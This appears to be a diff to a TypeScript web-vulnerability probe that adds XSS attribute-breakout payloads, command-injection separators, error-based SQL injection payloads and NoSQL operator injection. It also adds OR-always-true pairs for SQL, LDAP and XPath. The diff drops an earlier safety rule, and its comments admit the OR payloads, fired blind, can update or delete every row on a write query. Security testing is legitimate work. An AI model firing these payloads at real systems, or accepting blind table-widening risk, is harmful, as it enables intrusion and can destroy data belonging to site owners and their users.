@@ -70,6 +70,10 @@ const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
   (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape
   (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat
   (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }), // paren-wrap
+  // 2b) attribute stay-in — reflection INSIDE a quoted attribute value: add a handler WITHOUT opening
+  //     a new tag (many filters strip `<` but pass `"`+`on…`). Needs interaction, so ranked mid-list.
+  (n) => ({ payload: `" onmouseover=alert(${n}) x="`, sig: new RegExp(`" onmouseover=alert\\(${n}`, "i") }), // double-quoted attr
+  (n) => ({ payload: `' onmouseover=alert(${n}) x='`, sig: new RegExp(`' onmouseover=alert\\(${n}`, "i") }), // single-quoted attr
   // 3) non-alert JS-exec proofs LAST (won't satisfy an alert-checker — fallback evidence only)
   (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
   (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }),
@@ -128,9 +132,13 @@ const CMD_SEPARATORS: { name: string; wrap: (c: string) => string }[] = [
   { name: ";", wrap: (c) => `;${c}` },
   { name: "|", wrap: (c) => `|${c}` },
   { name: "&&", wrap: (c) => `&& ${c}` },
+  { name: "||", wrap: (c) => `|| ${c}` }, // OR-separator — runs when the BASE command fails (the ~half && misses)
+  { name: "& (win)", wrap: (c) => `& ${c}` }, // cmd.exe unconditional separator
   { name: "$( )", wrap: (c) => `$(${c})` },
   { name: "` `", wrap: (c) => `\`${c}\`` },
   { name: "newline", wrap: (c) => `\n${c}` }, // URL-encoded to %0A by searchParams
+  { name: "'; (quote-close)", wrap: (c) => `'; ${c}` }, // break out of a single-quoted shell arg first
+  { name: '"; (quote-close)', wrap: (c) => `"; ${c}` }, // break out of a double-quoted shell arg first
 ]
 const CMD_NOT_TESTED = [
   "blind/time-based command injection (no command output reflected in the response)",
@@ -140,37 +148,57 @@ const CMD_NOT_TESTED = [
 ]
 
 // ── error-signature classes (sqli / nosql / ldap / xpath) ──
-// The probe fires a battery of NON-DESTRUCTIVE payloads and reports, as raw facts, which
-// elicited that class's error signature or a boolean-differential. HARD SAFETY INVARIANT:
-// NOTHING here can WIDEN a write query's affected-row set — no OR-always-true, no stacked
-// queries (`;`), no write verbs, no time-delay. Boolean pairs are AND-based (AND narrows or
-// no-ops; it can never delete/update MORE rows). Bare quote/paren breakers only error out.
-// Exploitation (UNION, OR-bypass, blind extraction) is the AGENT's job, not the probe's.
+// The probe fires a battery of payloads and reports, as raw facts, which elicited that class's
+// error signature or a boolean-differential. Safety envelope: no stacked queries (`;`), no write
+// verbs, no time-delay. Bare quote/paren breakers only error out.
+// ⚠️ EXCEPTION (owner-authorized): the sqli boolPairs now include OR-always-true forms. Unlike AND
+// (which only narrows), OR '1'='1 makes a WHERE match EVERY row — on an UPDATE/DELETE sink this can
+// modify/delete the whole table, and the probe fires blind (it cannot tell a read sink from a write
+// one). This trades the AND-only safety guarantee for detection on row-count oracles whose base
+// matches no row. Deeper exploitation (UNION, blind extraction) is still the AGENT's job.
 interface ErrSigClass {
   payloads: string[]
-  // AND-based true/false pairs for a boolean-differential FACT (safe: AND cannot widen)
+  // true/false pairs for a boolean-differential FACT — AND (safe, narrows) + OR (widens, see warning)
   boolPairs?: { t: string; f: string }[]
   signatures: RegExp
 }
 const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
   sqli: {
-    // breakers + filter-bypass forms (comment/case/escape) — still ERROR-only, no OR/stacked/write.
-    payloads: ["'", '"', "`", "\\", "')", '")', "'))", `'"`, "'--", "'#", "'/*", "1'", '1"', "'/**/", "'-- -", "'/*!50000*/", "\\'"],
+    // breakers + filter-bypass forms (comment/case/escape) — ERROR-only, no OR/stacked/write.
+    // + DBMS-specific error-based type-cast probes: read-only functions that leak the version in a
+    //   distinctive error even where a generic bare quote is sanitized. No write/sleep/OOB.
+    payloads: ["'", '"', "`", "\\", "')", '")', "'))", `'"`, "'--", "'#", "'/*", "1'", '1"', "'/**/", "'-- -", "'/*!50000*/", "\\'",
+      "' AND extractvalue(1,concat(0x7e,version()))-- -", // MySQL: "XPATH syntax error: '~<ver>'"
+      "' AND 1=convert(int,@@version)-- -",               // MSSQL: "Conversion failed ... <ver>"
+      "' AND 1=cast(version() as int)-- -",               // PostgreSQL: "invalid input syntax for integer"
+      "' ORDER BY 9999-- -"],                             // column-overflow: "Unknown column '9999'"
     boolPairs: [
+      // AND-based (safe: AND only narrows — cannot widen a write query's affected rows)
       { t: "' AND '1'='1", f: "' AND '1'='2" },
       { t: '" AND "1"="1', f: '" AND "1"="2' },
       { t: "') AND ('1'='1", f: "') AND ('1'='2" },
       { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
       { t: "1 AND 1=1", f: "1 AND 1=2" },
-      { t: "'/**/AND/**/'1'='1", f: "'/**/AND/**/'1'='2" }, // comment-whitespace WAF bypass (AND only)
-      { t: "' AnD '1'='1", f: "' AnD '1'='2" }, // keyword-case bypass (AND only)
+      { t: "'/**/AND/**/'1'='1", f: "'/**/AND/**/'1'='2" }, // comment-whitespace WAF bypass
+      { t: "' AnD '1'='1", f: "' AnD '1'='2" }, // keyword-case bypass
+      // OR-based (owner-authorized). Detects a row-count oracle even when the base value matches
+      // NO row: OR '1'='1 makes the WHERE always-true → rows returned; OR '1'='2 leaves it false.
+      // ⚠️ On a write sink (UPDATE/DELETE ... WHERE) an always-true predicate matches EVERY row —
+      // this can modify/delete the whole table. The probe fires blind (it cannot know the sink is a
+      // read). Accepted risk per owner decision; the AND pairs above stay for the safe path.
+      { t: "' OR '1'='1", f: "' OR '1'='2" },
+      { t: '" OR "1"="1', f: '" OR "1"="2' },
+      { t: "') OR ('1'='1", f: "') OR ('1'='2" },
+      { t: "' OR 1=1-- -", f: "' OR 1=2-- -" },
+      { t: "1 OR 1=1", f: "1 OR 1=2" },
     ],
     signatures:
-      /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?/i,
+      /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?|XPATH syntax error|invalid input syntax for|Conversion failed when converting|Unknown column '\d/i,
   },
   nosql: {
-    // malformed value / type-confusion that a Mongo/BSON layer surfaces as an error — no
-    // operator-injection ([$ne]/[$gt]) here (deferred: it can change match semantics = widen).
+    // malformed value / type-confusion that a Mongo/BSON layer surfaces as an error. Operator-injection
+    // ([$ne]/[$gt]/[$regex]) is now ALSO fired as a boolean-differential — see the nosql operator step
+    // in probeErrorSigPoint (⚠️ owner-authorized widening: an always-true operator matches all docs).
     payloads: ["'", '"', "\\", "[", "]", "{", "}", "'\"", '{"a":', "']", "'}", "%00", "\\\"", "{[", "',", "NaN", "'\\"],
     signatures:
       /MongoError|MongoServerError|BSONError|BSONTypeError|E11000|CastError|failed to parse|unexpected token.*(json|in json)|SyntaxError:.*JSON|\$where|Mongoose|couldn't parse/i,
@@ -178,12 +206,27 @@ const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
   ldap: {
     // LDAP filter metacharacters that break the filter → server surfaces a filter/DN error.
     payloads: ["(", ")", "*", "\\", ")(", "*)", "(&", "(|", "))", "*()", "\\29", "\\28", "\\2a", "\\5c", "()", "&", "|"],
+    // filter-close + always-true (t) vs always-false (f): response-count differential = injection.
+    // Search-scope widening (read); consistent with the owner-authorized OR policy on sqli.
+    boolPairs: [
+      { t: "*)(cn=*)", f: "*)(cn=z%zznomatch)" },
+      { t: "*)(|(cn=*)", f: "*)(|(cn=z%zznomatch)" },
+      { t: "*)(objectClass=*)", f: "*)(objectClass=zzznomatch)" },
+    ],
     signatures:
       /LDAP.*(error|syntax|filter)|invalid DN|bad search filter|(javax|com)\.naming|invalid filter|Protocol error|InvalidSearchFilter|ldap_search/i,
   },
   xpath: {
     // XPath is a read-only query language (no write-widening risk); breakers elicit parser errors.
     payloads: ["'", '"', ")", "(", "]", "[", "//", "*", "')", '")', "' and '1'='2", "count(", "']", "'))", "concat(", "string("],
+    // TRUE/FALSE differential pairs (XPath is read-only — `or` cannot widen any write).
+    boolPairs: [
+      { t: "' or '1'='1", f: "' or '1'='2" },
+      { t: '" or "1"="1', f: '" or "1"="2' },
+      { t: "1 or 1=1", f: "1 or 1=2" },
+      { t: "' or true() or '1'='1", f: "' or false() or '1'='2" }, // function-based (literal '1'='1 filtered)
+      { t: '") or ("1"="1', f: '") or ("1"="2' },
+    ],
     signatures:
       /XPath|XPathException|xmlXPathEval|SyntaxError.*xpath|unclosed token|Invalid (expression|predicate)|xpath.*(syntax|error)|MS\.Internal\.Xml/i,
   },
@@ -399,6 +442,61 @@ function injectPathSegment(pathname: string, indexStr: string, value: string): s
   return segs.join("/")
 }
 
+// Set a JSON field to an ARBITRARY value (object/null/string) — for NoSQL operator injection where
+// the injected value is `{"$ne": null}`, not a string. Same path-walk as setJsonField.
+function setJsonValue(body: string, path: string, value: any): string {
+  try {
+    const root = JSON.parse(body || "{}")
+    const keys = path.split(".")
+    let cur: any = root
+    for (let i = 0; i < keys.length - 1; i++) {
+      if (typeof cur[keys[i]] !== "object" || cur[keys[i]] == null) cur[keys[i]] = {}
+      cur = cur[keys[i]]
+    }
+    cur[keys[keys.length - 1]] = value
+    return JSON.stringify(root)
+  } catch {
+    return body
+  }
+}
+
+// NoSQL OPERATOR injection: place a Mongo operator on the parameter instead of a scalar value.
+// query/form → `name[$op]=val` (RAW brackets preserved — many parsers decode-then-bracket-parse,
+// but raw is the widest-compatible wire form); json_body → `{"name": {"$op": val}}`. Other
+// locations (header/cookie/path) can't carry an operator → returns null (skip).
+// ⚠️ Same widening class as OR-sqli: `{$ne:null}` matches EVERY document → on a write op it hits all.
+function applyOperatorTarget(
+  r: ResolvedRequest,
+  point: InjPoint,
+  opKey: string,
+  opVal: any,
+): { url: string; body: string; headers: Record<string, string> } | null {
+  const headers = { ...r.headers }
+  const u = new URL(r.url.toString())
+  const origin = `${u.protocol}//${u.host}${u.pathname}`
+  const enc = (s: string) => encodeURIComponent(s)
+  const rawPair = `${point.name}[${opKey}]=${enc(String(opVal))}` // bracket RAW, value encoded
+  switch (point.location) {
+    case "query": {
+      const parts: string[] = []
+      for (const [k, v] of u.searchParams) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
+      parts.push(rawPair)
+      return { url: `${origin}?${parts.join("&")}`, body: r.body, headers }
+    }
+    case "form_field": {
+      const f = new URLSearchParams(r.body)
+      const parts: string[] = []
+      for (const [k, v] of f) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
+      parts.push(rawPair)
+      return { url: u.toString(), body: parts.join("&"), headers }
+    }
+    case "json_body":
+      return { url: u.toString(), body: setJsonValue(r.body, point.name, { [opKey]: opVal }), headers }
+    default:
+      return null
+  }
+}
+
 // Apply one payload at one point → the full mutated {url, body, headers}. Location-specific
 // sanitizers keep new reach (header/cookie/path/json) benign; guardHost still governs the host.
 function applyPayload(
@@ -572,6 +670,10 @@ function classifyXssContext(text: string, marker: string): string {
   if (i < 0) return "unknown"
   const before = text.slice(Math.max(0, i - 80), i)
   if (/<script\b[^>]*>(?:(?!<\/script>)[\s\S])*$/i.test(before)) return "javascript"
+  // RCDATA / escapable-raw-text: <svg> etc. do NOT parse here — you must CLOSE the host element first
+  if (/<textarea\b[^>]*>(?:(?!<\/textarea>)[\s\S])*$/i.test(before)) return "rcdata-textarea"
+  if (/<title\b[^>]*>(?:(?!<\/title>)[\s\S])*$/i.test(before)) return "rcdata-title"
+  if (/<style\b[^>]*>(?:(?!<\/style>)[\s\S])*$/i.test(before)) return "rcdata-style"
   if (/=\s*"[^"]*$/.test(before)) return "attribute-double-quote"
   if (/=\s*'[^']*$/.test(before)) return "attribute-single-quote"
   if (/<[a-z][^>]*$/i.test(before)) return "tag-name"
@@ -581,6 +683,9 @@ const XSS_BREAKOUT: Record<string, (n: string) => string> = {
   "attribute-double-quote": (n) => `"><svg data-p=${n}>`,
   "attribute-single-quote": (n) => `'><svg data-p=${n}>`,
   javascript: (n) => `</script><svg data-p=${n}>`,
+  "rcdata-textarea": (n) => `</textarea><svg data-p=${n}>`,
+  "rcdata-title": (n) => `</title><svg data-p=${n}>`,
+  "rcdata-style": (n) => `</style><svg data-p=${n}>`,
 }
 
 interface PointObservation {
@@ -943,6 +1048,42 @@ async function probeErrorSigPoint(
       signals,
     })
     await sleep(delayMs)
+  }
+  // 3) NoSQL OPERATOR-injection differential (query/form/json only). true = an operator that matches
+  //    EVERY document ($ne/$regex-all/$gt), false = one that matches none — the byte differential is
+  //    the canonical NoSQLi oracle (crash-breakers above only catch the parse-error case).
+  if (cls === "nosql") {
+    const opPairs: { t: [string, any]; f: [string, any] }[] = [
+      { t: ["$ne", "zzNoMatch"], f: ["$eq", "zzNoMatch"] }, // != nomatch (all) vs == nomatch (none)
+      { t: ["$regex", ".*"], f: ["$regex", "^zzNoMatch$"] }, // matches all vs matches none
+      { t: ["$gt", ""], f: ["$lt", ""] }, // > "" (all strings) vs < "" (none)
+    ]
+    for (const op of opPairs) {
+      if (abort.aborted || budget.sent >= budget.max) break
+      const tTgt = applyOperatorTarget(r, point, op.t[0], op.t[1])
+      const fTgt = applyOperatorTarget(r, point, op.f[0], op.f[1])
+      if (!tTgt || !fTgt) break // location can't carry an operator (header/cookie/path)
+      const t = await send(r, tTgt, abort, budget)
+      const fr = await send(r, fTgt, abort, budget)
+      if ("error" in t || "error" in fr) continue
+      if (blockSignal(t) || blockSignal(fr)) {
+        obs.block_signal ??= "operator pair blocked (WAF/rate-limit) — differential unreliable"
+        continue
+      }
+      const signals: string[] = []
+      if (Math.abs(t.text.length - fr.text.length) > floor) signals.push("bytes")
+      if (t.status !== fr.status) signals.push("status")
+      if (!!t.headers["set-cookie"] !== !!fr.headers["set-cookie"]) signals.push("set-cookie")
+      obs.bool_findings.push({
+        pair: `${point.name}[${op.t[0]}]=${op.t[1]}  vs  ${point.name}[${op.f[0]}]=${op.f[1]}`,
+        base_bytes: bl.bytes,
+        true: { status: t.status, bytes: t.text.length, ms: t.ms, location: t.headers["location"], set_cookie: !!t.headers["set-cookie"] },
+        false: { status: fr.status, bytes: fr.text.length, ms: fr.ms, location: fr.headers["location"], set_cookie: !!fr.headers["set-cookie"] },
+        differential: signals.length > 0,
+        signals,
+      })
+      await sleep(delayMs)
+    }
   }
   return obs
 }
